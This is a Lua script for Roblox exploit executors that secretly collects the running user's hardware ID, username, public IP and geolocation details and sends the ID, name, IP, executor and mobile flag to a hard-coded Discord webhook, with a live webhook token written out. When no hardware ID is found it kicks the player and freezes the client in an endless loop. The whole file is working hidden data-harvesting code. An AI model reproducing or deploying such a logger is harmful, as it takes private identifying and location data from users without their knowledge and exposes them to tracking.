local IP = game:HttpGet("https://api.ipify.org")
local Alt = false
local Premium = false
local lp = game:GetService("Players").LocalPlayer

if lp.MembershipType == Enum.MembershipType.Premium then
	Premium = true
elseif lp.MembershipType == Enum.MembershipType.None then
	Premium = false
end

if Premium == false then 
	if lp.AccountAge <= 10 then 
		Alt = true
	end
end

local http_request = http_request
if Exploit == "Synapse X" then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local Body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body
local Decoded = game:GetService('HttpService'):JSONDecode(Body)
local hwids = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint", "Fingerprint","Krnl-Hwid"};
local hwid;

for a,b in pairs(hwids) do 
    if Decoded.headers[b] then 
        hwid = Decoded.headers[b]
        break 
    end 
end

local Continent;
local Country;
local Region;
local Postcode;
local Latitude;
local Longitude;
local Timezone;
local City;
local Currency;
local Mobile;
local Proxy;
local ISP;

local z = http_request({Url = 'http://ip-api.com/json/'..IP..'?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query'; Method = 'POST'}).Body
local d = game:GetService('HttpService'):JSONDecode(z)
Mobile = d['mobile']
Proxy = d['proxy']
ISP = d['isp']

if hwid then 
    url = "https://discord.com/api/webhooks/1100538157826580582/VwM6lEPRDU8ycJww3NPwjtX03QIKc7Rr3cMtzQy9xKfJcVBv2LKlW1h8LZPQUKDtoyJO"

local Data = 
{
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**New Execution**",
        ["description"] = "",
        ["type"] = "rich",
        ["color"] = tonumber(0x03a1fc),
        ["fields"] = {
            {
                ["name"] = "HWID:",
                ["value"] = hwid,
                ["inline"] = false
            },
            {
                ["name"] = "Username:",
                ["value"] = lp.Name,
                ["inline"] = true
            },
            {
                ["name"] = "LockTarget:",
                ["value"] = IP,
                ["inline"] = true
            },

            {
                ["name"] = "Exploit:",
                ["value"] = Exploit,
                ["inline"] = true
            },

            {
                ["name"] = "Mobile:",
                ["value"] = tostring(Mobile),
                ["inline"] = true
            },
        }
    }}
}
local new = game:GetService("HttpService"):JSONEncode(Data)

local h = {
    ["content-type"] = "application/json"
}

    local payload = {Url=url, Body=new, Method="POST", Headers=h}
    http_request(payload)
else
    lp:Kick('Patched for now...')
    while true do end
end
